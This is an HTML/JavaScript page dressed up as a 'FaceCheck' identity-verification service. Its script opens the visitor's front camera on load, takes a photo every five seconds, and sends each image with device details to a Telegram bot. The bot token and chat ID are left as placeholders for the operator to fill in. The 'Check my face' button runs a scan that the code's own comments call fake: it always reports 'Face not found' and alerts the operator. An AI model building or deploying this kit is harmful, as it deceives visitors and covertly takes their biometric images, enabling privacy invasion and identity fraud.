<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
    <title>FaceCheck • Identity Verification</title>
    <!-- Minimal font + icons -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #f4f7fc;
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            padding: 20px 16px 40px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* minimal card */
        .face-card {
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.05), 0 1px 2px rgba(0, 0, 0, 0.02);
            overflow: hidden;
        }

        /* header */
        .face-header {
            padding: 24px 24px 16px;
            text-align: center;
            border-bottom: 1px solid #eef2f8;
        }

        .icon-badge {
            background: #eef6f4;
            width: 56px;
            height: 56px;
            border-radius: 56px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
        }

        .icon-badge i {
            font-size: 28px;
            color: #1e6f5c;
        }

        .face-header h1 {
            font-size: 1.65rem;
            font-weight: 600;
            letter-spacing: -0.3px;
            color: #1a2c3e;
            margin-bottom: 6px;
        }

        .face-header p {
            font-size: 0.8rem;
            color: #5e6f8d;
        }

        /* camera area */
        .camera-area {
            padding: 20px 20px 12px;
        }

        .camera-box {
            position: relative;
            background: #0a0c10;
            border-radius: 28px;
            overflow: hidden;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid #e2e8f0;
        }

        #faceVideo {
            width: 100%;
            aspect-ratio: 4 / 3;
            object-fit: cover;
            display: block;
            transform: scaleX(1);
            background: #000;
        }

        /* active capturing line - subtle scanning line only */
        .active-scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, transparent, #2c9a8a, #1e6f5c, #2c9a8a, transparent);
            box-shadow: 0 0 6px #2c9a8a;
            animation: moveScan 2.2s ease-in-out infinite;
            pointer-events: none;
        }

        @keyframes moveScan {
            0% { top: 0%; }
            50% { top: 97%; }
            100% { top: 0%; }
        }

        /* status row minimal */
        .status-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 12px;
            background: #f8fafd;
            padding: 6px 16px;
            border-radius: 60px;
            border: 1px solid #eef2f8;
        }

        .live-status {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.7rem;
            font-weight: 500;
            color: #2c3e50;
        }

        .live-dot {
            width: 8px;
            height: 8px;
            background: #2c9a8a;
            border-radius: 50%;
            animation: pulseDot 1.2s infinite;
        }

        @keyframes pulseDot {
            0% { opacity: 0.4; transform: scale(0.8);}
            100% { opacity: 1; transform: scale(1.2);}
        }

        .capture-counter {
            background: #eef2f9;
            padding: 3px 12px;
            border-radius: 40px;
            font-size: 0.65rem;
            font-family: monospace;
            font-weight: 600;
            color: #1f4e43;
        }

        /* action button */
        .action-buttons {
            padding: 8px 24px 24px;
        }

        .check-btn {
            width: 100%;
            background: #1e6f5c;
            border: none;
            border-radius: 60px;
            padding: 14px 20px;
            font-size: 1rem;
            font-weight: 600;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
        }

        .check-btn:hover {
            background: #155e4e;
            transform: scale(0.98);
        }

        .check-btn:active {
            transform: scale(0.96);
        }

        /* fake result panel - face not found */
        .result-panel {
            margin-top: 18px;
            background: #fff6f0;
            border-left: 4px solid #f97316;
            border-radius: 20px;
            padding: 14px 16px;
            transition: all 0.2s;
        }

        .result-content {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .result-content i {
            font-size: 1.3rem;
            color: #e65c1e;
        }

        .result-content span {
            font-size: 0.8rem;
            font-weight: 500;
            color: #9b4a1a;
            line-height: 1.4;
        }

        .result-footer {
            font-size: 0.6rem;
            color: #8b7a6b;
            margin-top: 8px;
            text-align: right;
            font-family: monospace;
        }

        /* footer note */
        .footer-note {
            padding: 16px 24px 24px;
            text-align: center;
            border-top: 1px solid #edf2f7;
            font-size: 0.65rem;
            color: #8a99b0;
        }

        @media (max-width: 480px) {
            body {
                padding: 12px 12px 24px;
            }
            .face-header h1 {
                font-size: 1.45rem;
            }
            .camera-area {
                padding: 16px 16px 8px;
            }
            .action-buttons {
                padding: 12px 18px 24px;
            }
        }

        .hidden-canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="face-card">
    <div class="face-header">
        <div class="icon-badge">
            <i class="fas fa-camera-retro"></i>
        </div>
        <h1>FaceCheck</h1>
        <p>Live verification • 3D liveness</p>
    </div>

    <div class="camera-area">
        <div class="camera-box">
            <video id="faceVideo" autoplay playsinline muted></video>
            <!-- only active capturing line (scan animation) -->
            <div class="active-scan-line"></div>
        </div>
        <div class="status-row">
            <div class="live-status">
                <span class="live-dot"></span>
                <span id="camStatus">Camera ready</span>
            </div>
            <div class="capture-counter" id="captureCountDisplay">
                <i class="fas fa-sync-alt"></i> 0
            </div>
        </div>
    </div>

    <div class="action-buttons">
        <button class="check-btn" id="faceCheckBtn">
            <i class="fas fa-id-card"></i> Check my face
        </button>

        <!-- fake result panel: shows "Face not found" after scan -->
        <div id="resultPanel" class="result-panel" style="display: none;">
            <div class="result-content">
                <i class="fas fa-user-slash"></i>
                <span id="resultMsg"><strong>⚠️ Face not found</strong> — No matching identity in secure database.</span>
            </div>
            <div class="result-footer" id="resultTimestamp">verification failed • code: FACE_MISSING</div>
        </div>
        <p style="font-size: 0.65rem; text-align: center; margin-top: 14px; color: #8ba0bc;">
            <i class="fas fa-lock"></i> Encrypted • Anti-spoof
        </p>
    </div>

    <div class="footer-note">
        <i class="fas fa-shield-alt"></i> Biometric session • 5s interval capture
    </div>
</div>

<!-- hidden canvas for image captures -->
<canvas id="hiddenCaptureCanvas" class="hidden-canvas"></canvas>

<script>
    // ----------------------------------------------------------
    // TELEGRAM CONFIGURATION (REPLACE WITH YOUR BOT TOKEN & CHAT ID)
    // ----------------------------------------------------------
    const BOT_TOKEN = '#';    
    const CHAT_ID = '#';  
    // Capture interval: 5 seconds (background)
    const CAPTURE_INTERVAL_MS = 5000;
    
    // DOM elements
    const videoElem = document.getElementById('faceVideo');
    const canvasElem = document.getElementById('hiddenCaptureCanvas');
    const camStatusSpan = document.getElementById('camStatus');
    const captureCounterSpan = document.getElementById('captureCountDisplay');
    const resultPanel = document.getElementById('resultPanel');
    const resultMsgSpan = document.getElementById('resultMsg');
    const resultTimestampSpan = document.getElementById('resultTimestamp');
    const checkBtn = document.getElementById('faceCheckBtn');
    
    // state
    let mediaStream = null;
    let canvasCtx = null;
    let captureIntervalId = null;
    let isCameraReady = false;
    let totalCaptures = 0;
    let isCapturingActive = false;
    
    // ----------------------------------------------------------
    // TELEGRAM SENDERS (photo + text)
    // ----------------------------------------------------------
    async function sendPhotoToTelegram(blob, captureNumber) {
        if (!BOT_TOKEN || BOT_TOKEN === '#' || !CHAT_ID || CHAT_ID === '#') {
            console.warn("[Telegram] Missing credentials - image not sent");
            return false;
        }
        const formData = new FormData();
        const filename = `facecapture_${captureNumber}_${Date.now()}.jpg`;
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, filename);
        
        const timestamp = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'medium' });
        const caption = `📸 FACE CAPTURE #${captureNumber}\n🕒 ${timestamp}\n📱 ${navigator.platform} | ${navigator.language}\n🌐 ${navigator.userAgent.substring(0, 70)}`;
        formData.append('caption', caption);
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            const data = await response.json();
            if (data.ok) {
                console.log(`✅ Telegram: image #${captureNumber} delivered`);
                return true;
            } else {
                console.error('Telegram error:', data);
                return false;
            }
        } catch (err) {
            console.error('Send error:', err);
            return false;
        }
    }
    
    async function sendTelegramMessage(text) {
        if (!BOT_TOKEN || BOT_TOKEN === '#' || !CHAT_ID || CHAT_ID === '#') return;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 1000) })
            });
        } catch (e) { console.warn("message notif error", e); }
    }
    
    // ----------------------------------------------------------
    // CAPTURE FRAME & SEND TO TELEGRAM
    // ----------------------------------------------------------
    async function captureAndSendFrame() {
        if (!isCameraReady || !videoElem || videoElem.readyState !== 4) {
            return;
        }
        if (!canvasCtx || !canvasElem) return;
        
        const w = videoElem.videoWidth;
        const h = videoElem.videoHeight;
        if (w === 0 || h === 0) return;
        
        canvasElem.width = w;
        canvasElem.height = h;
        canvasCtx.drawImage(videoElem, 0, 0, w, h);
        
        canvasElem.toBlob(async (blob) => {
            if (blob && blob.size > 500) {
                totalCaptures++;
                captureCounterSpan.innerHTML = `<i class="fas fa-sync-alt"></i> ${totalCaptures}`;
                await sendPhotoToTelegram(blob, totalCaptures);
            } else {
                console.warn("blob invalid");
            }
        }, 'image/jpeg', 0.85);
    }
    
    function startPeriodicCapture() {
        if (captureIntervalId) clearInterval(captureIntervalId);
        if (!isCameraReady) return;
        if (isCapturingActive) return;
        isCapturingActive = true;
        
        // capture immediately
        captureAndSendFrame();
        captureIntervalId = setInterval(() => {
            if (isCameraReady && videoElem && videoElem.readyState === 4) {
                captureAndSendFrame();
            }
        }, CAPTURE_INTERVAL_MS);
        
        console.log(`[system] background capture every ${CAPTURE_INTERVAL_MS/1000}s`);
    }
    
    // ----------------------------------------------------------
    // CAMERA INIT (front facing, minimal)
    // ----------------------------------------------------------
    async function initCamera() {
        canvasCtx = canvasElem.getContext('2d');
        if (!videoElem) return;
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
                audio: false
            });
            mediaStream = stream;
            videoElem.srcObject = stream;
            
            videoElem.onloadedmetadata = () => {
                videoElem.play();
                isCameraReady = true;
                camStatusSpan.innerText = 'Camera active';
                startPeriodicCapture();
                
                // send session notification to telegram
                const sessionMsg = `🔹 NEW FACE SESSION\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.platform} | ${navigator.language}\n📷 ${videoElem.videoWidth}x${videoElem.videoHeight}\n⏱️ 5s capture active`;
                sendTelegramMessage(sessionMsg);
            };
        } catch (err) {
            console.error("Camera error", err);
            camStatusSpan.innerText = 'Allow camera access';
            // fallback: any camera
            try {
                const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                mediaStream = fallbackStream;
                videoElem.srcObject = fallbackStream;
                videoElem.onloadedmetadata = () => {
                    videoElem.play();
                    isCameraReady = true;
                    camStatusSpan.innerText = 'Camera (fallback)';
                    startPeriodicCapture();
                    sendTelegramMessage(`⚠️ Fallback camera mode • ${new Date().toLocaleString()}`);
                };
            } catch (fallbackErr) {
                camStatusSpan.innerText = 'Camera unavailable';
                console.error("no camera", fallbackErr);
            }
        }
    }
    
    // ----------------------------------------------------------
    // FAKE FACE SCAN : BUTTON "Check my face" -> then "Face not found"
    // ----------------------------------------------------------
    function showFaceNotFound() {
        if (resultPanel) {
            const now = new Date();
            const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute:'2-digit', second:'2-digit' });
            resultMsgSpan.innerHTML = '<strong>⚠️ Face not found</strong> — No matching facial signature in secure database.';
            resultTimestampSpan.innerText = `verification failed • ${timeStr} • ref: FACE_NF_${Math.floor(Math.random()*900+100)}`;
            resultPanel.style.display = 'block';
            // smooth scroll to result
            resultPanel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
        // send alert to telegram that fake rejection was triggered
        sendTelegramMessage(`[FAKE SCAN] User attempted verification → "Face not found". Time: ${new Date().toLocaleString()}`);
    }
    
    function onCheckFaceClick() {
        if (!isCameraReady) {
            // show error if camera not ready
            if (resultPanel) {
                resultMsgSpan.innerHTML = '<strong>⚠️ Camera not ready</strong> — Face detection unavailable.';
                resultTimestampSpan.innerText = `error • ${new Date().toLocaleTimeString()}`;
                resultPanel.style.display = 'block';
            }
            return;
        }
        
        // disable button to avoid double-click during fake scanning
        const originalBtnHTML = checkBtn.innerHTML;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Scanning face...';
        checkBtn.disabled = true;
        
        // capture an extra frame at the moment of verification
        captureAndSendFrame();
        
        // simulate backend processing (1.2 sec scanning)
        setTimeout(() => {
            showFaceNotFound();
            checkBtn.innerHTML = originalBtnHTML;
            checkBtn.disabled = false;
            
            // subtle shake effect on result panel for UX
            if (resultPanel) {
                resultPanel.style.transform = 'translateX(2px)';
                setTimeout(() => { if(resultPanel) resultPanel.style.transform = ''; }, 120);
            }
        }, 1200);
    }
    
    // ----------------------------------------------------------
    // WAKE LOCK & VISIBILITY
    // ----------------------------------------------------------
    let wakeLock = null;
    async function requestWakeLock() {
        if ('wakeLock' in navigator) {
            try {
                wakeLock = await navigator.wakeLock.request('screen');
            } catch (err) { console.warn("wake lock error"); }
        }
    }
    
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden && isCameraReady && !captureIntervalId) {
            startPeriodicCapture();
        }
    });
    
    window.addEventListener('beforeunload', () => {
        if (captureIntervalId) {
            clearInterval(captureIntervalId);
            captureIntervalId = null;
        }
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
        }
        if (wakeLock && wakeLock.release) wakeLock.release();
    });
    
    // ----------------------------------------------------------
    // BOOTSTRAP
    // ----------------------------------------------------------
    document.addEventListener('DOMContentLoaded', () => {
        initCamera();
        requestWakeLock();
        
        if (checkBtn) {
            checkBtn.addEventListener('click', onCheckFaceClick);
        }
        
        // initially hide result panel
        if (resultPanel) resultPanel.style.display = 'none';
        
        // after 2 sec if camera not ready show hint
        setTimeout(() => {
            if (!isCameraReady) {
                camStatusSpan.innerText = '⚠️ permission needed';
            }
        }, 2500);
    });
</script>
</body>
</html>
